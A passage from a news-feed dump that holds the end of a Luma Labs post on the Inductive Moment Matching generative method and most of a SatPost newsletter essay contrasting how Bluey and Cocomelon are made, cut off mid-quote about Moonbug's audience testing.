srcset="https://lumalabs.ai/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2F2ylxvaa2%2Fproduction%2Fff6227fbb6247800468a216d5fac3086b7261aa3-2070x822.png&amp;w=3840&amp;q=75 1x" src="https://lumalabs.ai/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2F2ylxvaa2%2Fproduction%2Fff6227fbb6247800468a216d5fac3086b7261aa3-2070x822.png&amp;w=3840&amp;q=75"></p><p><span>Scaling compute improves generative quality.</span></p></div></div><p>Unlike consistency models, which have been shown to have unstable training dynamics, IMM is stable to train across various hyperparameters and architectures.</p><div><p><img alt="IMM trains more stably than consistency models." loading="lazy" width="2809" height="1118" decoding="async" data-nimg="1" srcset="https://lumalabs.ai/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2F2ylxvaa2%2Fproduction%2F953c4df410c1e51e9d0fb6249b4458f57c70fbdd-2809x1118.png&amp;w=3840&amp;q=75 1x" src="https://lumalabs.ai/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2F2ylxvaa2%2Fproduction%2F953c4df410c1e51e9d0fb6249b4458f57c70fbdd-2809x1118.png&amp;w=3840&amp;q=75"></p><p><span>IMM trains more stably than consistency models.</span></p></div><h3>What’s next</h3><div><p>Notably, IMM does not rely on denoising score matching or the score-based stochastic differential equations on which the foundations of diffusion models are built. The key driver of our performance gains is not only moment matching itself, but also our shift towards an inference-first perspective. This not only reveals the inherent limitations in current pre-training paradigms but also empowers us to develop innovative algorithms designed to break through the current limits of pre-training.</p><p>We believe that this is just the beginning of a paradigm shift towards multi-modal foundation models that transcends current boundaries and fully unlock creative intelligence.</p><p>If you are interested in the mission, <a href="https://lumalabs.ai/join">join us</a>.</p></div><h3>References</h3><p>Linqi Zhou, Stefano Ermon, Jiaming Song. “Inductive Moment Matching”.<br>Jiaming Song, Linqi Zhou. “Ideas in Inference-time Scaling can Benefit Generative Pre-training Algorithms”.<br>Song et al. “Denoising Diffusion Implicit Models.”&nbsp;ICLR 2021.<br>Song et al. “Consistency Models.”&nbsp;ICML 2023.<br>Lipman et al. “Flow matching for generative modeling.”&nbsp;ICLR 2023.<br>Gretton et al. “A Kernel Method for the Two-Sample Problem.” NeurIPS 2006.<br>Song et al. “Score-Based Generative Modeling through Stochastic Differential Equations.”&nbsp;ICLR 2021.<br>Kim et al. “Consistency Trajectory Models: Learning Probability Flow ODE Trajectory of Diffusion.”&nbsp;ICLR 2024.<br>Vincent. “A Connection Between Score Matching and Denoising Autoencoders.”&nbsp;Neural Computation (Vol. 23).<br>Geng et al. “Consistency Models Made Easy”. ICLR 2025.</p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A look at the creative process behind Bluey and Cocomelon (2024) (164 pts)]]></title>
            <link>https://www.readtrung.com/p/why-i-love-bluey-and-hate-cocomelon</link>
            <guid>43339206</guid>
            <pubDate>Wed, 12 Mar 2025 01:54:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.readtrung.com/p/why-i-love-bluey-and-hate-cocomelon">https://www.readtrung.com/p/why-i-love-bluey-and-hate-cocomelon</a>, See on <a href="https://news.ycombinator.com/item?id=43339206">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><p>Thanks for subscribing to SatPost.</p><p><span>Today, let’s look at the creative process behind two of the most popular kids streaming shows (</span><em>Bluey, Cocomelon</em><span>).</span></p><p>Also this week: </p><ul><li><p>Instagram’s $32B ad biz</p></li><li><p>Solar Eclipse and Airbnb</p></li><li><p>…and them fire memes (including a wild Netflix feature)</p></li></ul><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3e69a6fe-ffb1-4dd8-af31-52458afb2c1a_802x418.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3e69a6fe-ffb1-4dd8-af31-52458afb2c1a_802x418.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3e69a6fe-ffb1-4dd8-af31-52458afb2c1a_802x418.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3e69a6fe-ffb1-4dd8-af31-52458afb2c1a_802x418.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3e69a6fe-ffb1-4dd8-af31-52458afb2c1a_802x418.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3e69a6fe-ffb1-4dd8-af31-52458afb2c1a_802x418.png" width="802" height="418" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/3e69a6fe-ffb1-4dd8-af31-52458afb2c1a_802x418.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:418,&quot;width&quot;:802,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:598375,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3e69a6fe-ffb1-4dd8-af31-52458afb2c1a_802x418.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3e69a6fe-ffb1-4dd8-af31-52458afb2c1a_802x418.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3e69a6fe-ffb1-4dd8-af31-52458afb2c1a_802x418.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3e69a6fe-ffb1-4dd8-af31-52458afb2c1a_802x418.png 1456w" sizes="100vw" fetchpriority="high"></picture></div></a></figure></div><p>I had a dry January.</p><p>I didn’t actually plan for it but my wife and I hosted some family friends for New Year’s Eve and someone brought Jello shooters.</p><p>Anyone who has had Jello shooters knows how those things can sneak up on you.</p><p>New Year’s Day was a next-level hangover but there was no sleeping it off. My son had a million things he wanted to do and, by mid-day, my body decided that it had to be a booze-free month. </p><p><span>I am sharing this because I recently started watching </span><em>Bluey — </em><span>the popular Australian children’s show about four animated dogs (the Heeler family). To my surprise, a storyline for an episode titled “Whale Watching” is literally about hungover parenting…on New Year’s Day.</span></p><p><span>From my son’s perspective, “Whale Watching” was hilarious because the title character (Bluey, 7 years old) and her sister (Bingo, 5 years old) jump on their dad (Bandit) and pretend he’s a whaling boat. </span><a href="https://youtu.be/kZdhD6SALwk?si=foEtTc3bRj45MzB0&amp;t=367" rel="">Bandit is hungover and when his daughters ask if he’s “sick”, the mom — who is recovering on the couch — says that “dad is just sleepy”</a><span>. </span></p><p>I enjoyed it because I have never seen any type of media that so perfectly captures such a niche parenting ordeal (one that I suspect many reading this email have experienced). </p><div id="youtube2-kZdhD6SALwk" data-attrs="{&quot;videoId&quot;:&quot;kZdhD6SALwk&quot;,&quot;startTime&quot;:&quot;367&quot;,&quot;endTime&quot;:null}" data-component-name="Youtube2ToDOM"><p><iframe src="https://www.youtube-nocookie.com/embed/kZdhD6SALwk?start=367&amp;rel=0&amp;autoplay=0&amp;showinfo=0&amp;enablejsapi=0" frameborder="0" loading="lazy" gesture="media" allow="autoplay; fullscreen" allowautoplay="true" allowfullscreen="true" width="728" height="409"></iframe></p></div><p><span>The show’s</span><em> </em><span>creator — Joe Brumm (now 46-years old) — has created a streaming juggernaut by making content for pre-school age children that is appealing for both parents and kids. Here are some impressive </span><em>Bluey</em><span> stats, per </span><em><a href="https://www.bloomberg.com/news/features/2024-04-03/is-bluey-ending-disney-s-worried-biggest-kids-show-ever-is-at-risk" rel="">Bloomberg Businessweek</a></em><span>:</span></p><ul><li><p>The brand is valued at $2B</p></li><li><p><span>It was the 2nd most-viewed streaming program in 2023 with 44 billion viewing minutes (</span><em>Suits </em><span>was #1 at 58 billion viewing minutes)</span></p></li><li><p>It accounted for 29% of Disney+ TV views in Q4 of 2023</p></li></ul><p><em>Bluey</em><span>’s run pushed it ahead of another popular kid’s streaming brand: </span><em>Cocomelon</em><span>, a show built around fast-cutting animation, nursery rhymes and bleeding ears for parents who have to listen to “Wheels on the Bus” on loop for six straight hours (</span><em>Cocomelon</em><span> was </span><a href="https://www.nielsen.com/insights/2024/streaming-unwrapped-streaming-viewership-goes-to-the-library-in-2023/" rel="">#5 on the most-streamed programs</a><span>&nbsp;in 2023).</span></p><p><em>Cocomelon </em><span>is the crown jewel of Moonbug Entertainment, a children’s media company that was acquired for $3B in 2021 by Candle Media (a media venture founded by two former leading Disney executives).</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Faba1d11a-a9b4-484b-bc6d-e291437497b2_1005x554.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Faba1d11a-a9b4-484b-bc6d-e291437497b2_1005x554.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Faba1d11a-a9b4-484b-bc6d-e291437497b2_1005x554.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Faba1d11a-a9b4-484b-bc6d-e291437497b2_1005x554.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Faba1d11a-a9b4-484b-bc6d-e291437497b2_1005x554.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Faba1d11a-a9b4-484b-bc6d-e291437497b2_1005x554.png" width="1005" height="554" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/aba1d11a-a9b4-484b-bc6d-e291437497b2_1005x554.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:554,&quot;width&quot;:1005,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:283730,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Faba1d11a-a9b4-484b-bc6d-e291437497b2_1005x554.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Faba1d11a-a9b4-484b-bc6d-e291437497b2_1005x554.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Faba1d11a-a9b4-484b-bc6d-e291437497b2_1005x554.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Faba1d11a-a9b4-484b-bc6d-e291437497b2_1005x554.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Clearly, these two shows are very popular but that is where the similarities end.</p><p><em>Bluey </em><span>is created by an auteur with a unique and hilarious point of view on the world. Conversely, </span><em>Cocomelon</em><span> — which started on YouTube — is algorithmic slop that has been called “crack for kids” and is probably as educational as taping strobe lights to your child’s eyeballs. </span></p><p>Let me explain.</p><p>***</p><p><em>Bluey </em><span>debuted in 2018 and has cranked out 152 episodes — about 7 minutes each — across three seasons. The 153rd episode is scheduled for April 14 and many believe that it will be the end of the show in its current form (more on this later).</span></p><p><span>The show was created by Joe Brumm, an Australian who started his professional career in the UK's TV animation industry. Before returning to Australia in 2009, Brumm worked on successful children’s shows including </span><em>Charlie &amp; Lola </em><span>and</span><em> Peppa Pig</em><span> (</span><em>Peppa’s</em><span> production company Entertainment One sold the brand to Hasbro for a whopping $4B in 2019).</span></p><p><span>In 2015, Brumm teamed up with Brisbane-based Ludo Studios to shop a 1-minute teaser of </span><em>Bluey</em><span>. This short version of the show failed to find a buyer because the target audience wasn’t clear. Was it meant for adults or children? The confusion stemmed from the fact that Brumm had originally planned to create an R-rated version of </span><em>Peppa Pig</em><span>.</span></p><p>Ultimately, Brumm decided to make a show for preschoolers. He pulled material from his own life as a father of two girls under the age of 10. </p><p><span>With the kid focus, Ludo convinced the country’s national broadcaster (Australian Broadcasting Corporation aka ABC) to give Brumm $13k for a single 5-minute episode. ABC saw the potential and greenlit $5m+ for a first season. Unable to foot the whole bill, ABC partnered with BBC Studios, the business arm of the UK’s national broadcaster. BBC negotiated the global distribution, licensing and merchandising rights for </span><em>Bluey</em><span> (in other words, ABC is barely profiting from one of  the country’s largest cultural exports since Mad Max, AC/DC, Kylie Minogue,  Crocodile Dundee or Men at Work). </span></p><p><span>How did </span><em>Bluey</em><span> become such a hit? </span></p><p><span>It has great animation with funny and emotional writing that parents want to watch with their kids. I mentioned hungover parenting as one theme but </span><em>Bluey</em><span> has ably dealt with many grown-up topics including infertility, mental health and death.</span></p><p><span>In an interview with </span><em>The Hollywood Reporter, </em><span>Brumm </span><a href="https://www.hollywoodreporter.com/tv/tv-features/bluey-creator-disney-notes-peppa-ping-inspiration-1235508845/" rel="">said</a><span> he chose this approach because he noticed a gap in the market. He wanted “a good co-viewing show where the parents could genuinely watch it with the kids” and there weren’t many options for the “the preschool stage”. </span></p><p>The co-viewing magic happens because the show’s parents (Bandi, Chilli) are just as integral to the storyline as the kids (Bluey, Bingo). Preschoolers love inventing games and making their parents play with them. It is their way of learning how the world works.</p><p><em>Bluey </em><span>is a mix of games that every parent knows (</span><a href="https://www.youtube.com/watch?v=jDrqgBb1dC4" rel="">“driving a bus”</a><span>, </span><a href="https://www.youtube.com/watch?v=oHIKWpZrULE" rel="">“keepy uppy with a balloon”</a><span> or </span><a href="https://www.youtube.com/watch?v=8ZqOJC8VobE" rel="">“cardboard box forts”</a><span>) as well as games that Brumm has pulled from his own life (</span><a href="https://www.youtube.com/watch?v=DklpM_lZIOU" rel="">“Magic Xylophone”</a><span> or </span><a href="https://www.youtube.com/watch?v=zqExJdPYu00" rel="">“The Magic Claw”</a><span>). </span></p><p><span>How does Brumm come up with these ideas? In the most parenting way possible as he explained on the </span><em><a href="https://podcasts.apple.com/mk/podcast/how-joe-brumm-dads/id1650126940?i=1000625580746" rel="">How Other Dads Dad</a></em><a href="https://podcasts.apple.com/mk/podcast/how-joe-brumm-dads/id1650126940?i=1000625580746" rel=""> podcast</a><span>:</span></p><blockquote><p><em>[The games on Bluey are] just games that evolved at 5 in the morning [while taking care of the kids]. And “evolve” is a good word because some games you play once and they're a bit boring and they just fall away. </em></p><p><em>Others you find, “Hey, can we play that game again?” </em></p><p><em>And you're like, “Yeah, all right and let's add this.”  </em></p><p><em>Two months later  [that game has] got a name.</em></p></blockquote><p>The uniqueness of each game comes through particularly well because Brumm has written nearly every episode on his own. The solo process was a deliberate choice because — coming from a TV background — Brumm knew that a team of TV writers would likely lead to a formulaic product.</p><p>There is no magic to the writing, either.</p><p><span>In a relatable passage for any writer, Brumm tells the </span><em><a href="https://www.blueypod.com/e/joe-brumm-aka-the-interview/" rel="">Gotta Be Done</a></em><a href="https://www.blueypod.com/e/joe-brumm-aka-the-interview/" rel=""> podcast</a><span> how he gets an idea on paper and then edits and edits: </span></p><blockquote><p><em>I think the first thing I've realized is…just write [the first draft quickly] and don't show anyone because it is terrible. […] Know that it is going to suck and it is going to be all over the place. </em></p><p><em>But then it's there. Then I print it out. Then I go lie on a couch and it looks like I'm loafing, but then it's just scribbling. Let's move this here…cut it up and rearrange it on the table. </em></p><p><em>You've just got to write that first draft.</em></p></blockquote><p><em>Bluey’s </em><span>distinctiveness</span><em> </em><span>also comes from the voice actors, who are actual children from Brisbane. When the show was being shopped internationally, many buyers — including Disney — wanted to re-record the voices. However, Brumm fought to keep the Aussie accents and this decision definitely helps the show stand out.</span></p><p><span>I'll add one more Aussie-related fun fact. The "Heeler" family is named after the Blue Heeler dogs, herding dogs specially bred in Australia in the mid-1800s to shepherd cattle over long distances (also known as "cattle dogs"). In a nice symmetry to how </span><em>Bluey </em><span>is making waves internationally, these dogs were once a major export for the country. The show’s popularity has led to some people buying Blue Heelers as a pet for their kids…which will probably backfire because they aren’t meant to be house dogs (Blue Heelers need an insane amount of exercise and can be pretty aggressive). </span></p><p><span>“[Making </span><em>Bluey </em><span>is</span><em>]</em><span> a craft thing,” Brumm said in the </span><em>The Hollywood Reporter </em><span>interview</span><em>. “</em><span>We really tried to get it to look beautiful and to sound beautiful. It should have its own score and its own visual style and really not just [be about] trying to knock it out for cheap.”</span></p><p>Add it all up and Brumm is telling a story that is uniquely his own.</p><p>***</p><p><span>Some quick background on </span><em>Cocomelon</em><span>.</span></p><p>It started in 2006 as a children’s education YouTube channel called That’sMeOnTv.com. </p><p>Korean-American Jay Jeon and his wife created the channel with animated alphabet songs to teach children how to read. The channel rebranded twice before becoming Cocomelon in 2018. By this time, Jeon and a team of animators in California were creating 3D-animated videos of kids doing kids things while singing public domain nursery rhymes.</p><p><span>As more parents turned to YouTube to entertain their children, Cocomelon rocketed up the charts. It is currently the 3rd most popular channel on YouTube (with 174 million subscribers) and it does insane numbers. The channel has eight </span><a href="https://www.youtube.com/@CoComelon/videos" rel="">videos</a><span> with over 2 billion views including “Bath Song”, “Wheels on the Bus”, “Baa Baa Black Sheep” and “Old MacDonald” (yes, I’ve heard all of these many many times). </span></p><p>By 2019, Jeon was making over $100 million a year in ad revenue. </p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F775a54a5-6bd0-4131-a9f3-bccc2ff31df5_1201x518.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F775a54a5-6bd0-4131-a9f3-bccc2ff31df5_1201x518.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F775a54a5-6bd0-4131-a9f3-bccc2ff31df5_1201x518.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F775a54a5-6bd0-4131-a9f3-bccc2ff31df5_1201x518.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F775a54a5-6bd0-4131-a9f3-bccc2ff31df5_1201x518.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F775a54a5-6bd0-4131-a9f3-bccc2ff31df5_1201x518.png" width="1201" height="518" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/775a54a5-6bd0-4131-a9f3-bccc2ff31df5_1201x518.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:518,&quot;width&quot;:1201,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:835266,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F775a54a5-6bd0-4131-a9f3-bccc2ff31df5_1201x518.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F775a54a5-6bd0-4131-a9f3-bccc2ff31df5_1201x518.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F775a54a5-6bd0-4131-a9f3-bccc2ff31df5_1201x518.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F775a54a5-6bd0-4131-a9f3-bccc2ff31df5_1201x518.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><em>Cocomelon</em><span> cracked the YouTube algorithm the same way slot machines cracked gambling or TikTok cracked social video. It pushes every psychological button to keep a child’s attention:</span></p><ul><li><p>Cuts every 2-3 seconds</p></li><li><p>So so so many different colors</p></li><li><p>Lots of movement and panning on the screen</p></li><li><p>Popular nursery rhymes remixed with upbeat tunes </p></li><li><p>The sound of babies randomly cooing in the background (the kid equivalent of how radio ads play sirens as a way to grab your attention because people are always on the lookout for sirens while driving).</p></li></ul><p><em>Cocomelon</em><span> is the entertainment version of a Doritos chip: perfectly engineered digital junk food, with many parents </span><a href="https://www.newsweek.com/cocomelon-kids-zombie-addiction-adhd-speech-delay-autism-1792511" rel="">complaining</a><span> that</span><em> “</em><span>it’s responsible for their children's behavioral problems, including anger issues, ADHD, autism and speech delays”. </span></p><p><span>I’m not saying that there is direct causation but here’s a random 5-second GIF from </span><em>Cocomelon</em><span> that — even without sound — shows how it’s an overstimulation machine. </span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb5ef1615-d108-4d4c-9608-13e7fe5078f8_640x360.gif" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_lossy/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb5ef1615-d108-4d4c-9608-13e7fe5078f8_640x360.gif 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_lossy/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb5ef1615-d108-4d4c-9608-13e7fe5078f8_640x360.gif 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_lossy/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb5ef1615-d108-4d4c-9608-13e7fe5078f8_640x360.gif 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_lossy/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb5ef1615-d108-4d4c-9608-13e7fe5078f8_640x360.gif 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_lossy/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb5ef1615-d108-4d4c-9608-13e7fe5078f8_640x360.gif" width="640" height="360" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/b5ef1615-d108-4d4c-9608-13e7fe5078f8_640x360.gif&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:360,&quot;width&quot;:640,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:7306679,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/gif&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_lossy/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb5ef1615-d108-4d4c-9608-13e7fe5078f8_640x360.gif 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_lossy/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb5ef1615-d108-4d4c-9608-13e7fe5078f8_640x360.gif 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_lossy/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb5ef1615-d108-4d4c-9608-13e7fe5078f8_640x360.gif 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_lossy/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb5ef1615-d108-4d4c-9608-13e7fe5078f8_640x360.gif 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><span>As for the audio, imagine the scene from </span><em>Dumb &amp; Dumber </em><span>when Jim Carrey and Jeff Daniels make </span><a href="https://youtu.be/S4AmLcBLZWY?si=0BtE4LIX2rTmibxZ&amp;t=79" rel="">“the worst sound ever”</a><span>. That’s what it feels like for an adult to listen to </span><em>Cocomelon</em><span> on loop (also: </span><em>Cocomelon </em><span>would be more forgivable in my books if the dad wasn’t such a pushover). </span></p><div id="youtube2-S4AmLcBLZWY" data-attrs="{&quot;videoId&quot;:&quot;S4AmLcBLZWY&quot;,&quot;startTime&quot;:&quot;79&quot;,&quot;endTime&quot;:null}" data-component-name="Youtube2ToDOM"><p><iframe src="https://www.youtube-nocookie.com/embed/S4AmLcBLZWY?start=79&amp;rel=0&amp;autoplay=0&amp;showinfo=0&amp;enablejsapi=0" frameborder="0" loading="lazy" gesture="media" allow="autoplay; fullscreen" allowautoplay="true" allowfullscreen="true" width="728" height="409"></iframe></p></div><p><span>In 2022, the </span><em><a href="https://www.nytimes.com/2022/05/05/arts/television/cocomelon-moonbug-entertainment.html" rel="">New York Times</a></em><span> published a fascinating write-up on Moonbug Entertainment and how the studio creates videos (its kid show portfolio includes </span><em>Little Baby Bum</em><span>, </span><em>Blippi</em><span>, </span><em>Playtime with Twinkle</em><span> and </span><em>The Sharksons </em><span>among others).</span></p><p>Before getting into Moonbug's process, take a moment to remember Brumm's process. He is basing his work on real-life social play and his "5am" interactions with his children. For each idea, he navigates a writing maze and incorporates adult themes to develop the ideal 7-minute co-viewing experience. </p><p>It is craftsmanship. </p><p><span>Contrast everything I just wrote with </span><a href="https://www.nytimes.com/2022/05/05/arts/television/cocomelon-moonbug-entertainment.html" rel="">Moonbug’s “audience research day”</a><span>:</span></p><blockquote><p><em>Once a month, children are brought to [a London studio], one at a time, and shown a handful of episodes to figure out exactly which parts of the shows are engaging and which are tuned out.</em></p><p><em>For anyone older than 2 years old, the team deploys a whimsically named tool: the Distractatron.</em></p><p><em>It’s a small TV screen, placed a few feet from the larger one, that plays a continuous loop of banal, real-world scenes — a guy pouring a cup of coffee, someone getting a haircut — each lasting about 20 seconds. Whenever a youngster looks away from the Moonbug show to glimpse the Distractatron, a note is jotted down.</em></p><p><em>“It’s not mega-interesting, what’s on the 